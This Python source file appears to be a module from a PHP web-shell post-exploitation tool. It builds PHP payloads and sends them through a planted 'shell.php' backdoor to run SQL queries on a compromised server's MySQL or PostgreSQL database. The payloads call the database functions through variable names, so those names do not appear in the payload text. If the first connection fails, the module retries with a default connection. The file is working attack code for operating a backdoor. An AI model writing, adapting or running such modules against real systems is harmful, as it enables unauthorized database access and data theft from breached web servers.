'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
import random
from core.parameters import ParametersList, Parameter as P

classname = 'Query'
 

    
class Query(Module):
    '''Execute SQL query
    '''
    
    vectors = VectorList([
            Vector('shell.php', 'php_fetch', [ """
$c="%s"; $q="%s"; $f="%s";
if(@$c("%s","%s","%s")){
$result = $q("%s");
while (list($table) = $f($result)) {
echo $table."\n";
}
mysql_close();
}""", """
$c="%s"; $q="%s"; $f="%s"; $h="%s"; $u="%s"; $p="%s";
$result = $q("%s");
if($result) {
while (list($table) = $f($result)) {
echo $table."\n";
}
}
mysql_close();
"""])
            ])

    params = ParametersList('Execute SQL query', vectors,
            P(arg='dbms', help='Database', choices=['mysql', 'postgres'], required=True, pos=0),
            P(arg='user', help='SQL user', required=True, pos=1),
            P(arg='pwd', help='SQL password', required=True, pos=2),
            P(arg='query', help='SQL query', required=True, pos=3),
            P(arg='host', help='SQL host or host:port', default='127.0.0.1', pos=4)
            )


    def run_module( self, mode, user, pwd, query, host):

        if mode == 'mysql':
            sql_connect = "mysql_connect"
            sql_query = "mysql_query"
            sql_fetch = "mysql_fetch_row"
        else:
            sql_connect = "pg_connect"
            sql_query = "pg_query"
            sql_fetch = "pg_fetch_row"

        vectors = self._get_default_vector2()
        if not vectors:
            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
        for vector in vectors:

            response = self.__execute_payload(vector, [sql_connect, sql_query, sql_fetch, host, user, pwd, query])
            if response != None:
                self.params.set_and_check_parameters({'vector' : vector.name})
                return response
            
        
        self.mprint('[%s] No response, check credentials and dbms availability.' % (self.name))
                
        
    def __execute_payload(self, vector, parameters):
        
        payload = self.__prepare_payload(vector, parameters) 
        response = self.modhandler.load(vector.interpreter).run({ 0: payload })
        
        if not response:
            
            payload = self.__prepare_payload(vector, parameters, 1) 
            response = self.modhandler.load(vector.interpreter).run({ 0: payload })
            
            if response:
                
                self.mprint("[%s] Error connecting to '%s:%s@%s', using default (query 'SELECT USER();' to print out)" % (self.name, parameters[3], parameters[4], parameters[5]),  3);
                
                return response
        else:
            return response
        
        return None
    
    

    def __prepare_payload( self, vector, parameters, payloadnum = 0 ):
        
        if vector.payloads[payloadnum].count( '%s' ) == len(parameters):
            return vector.payloads[payloadnum] % tuple(parameters)
        else:
            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
        



    
    
    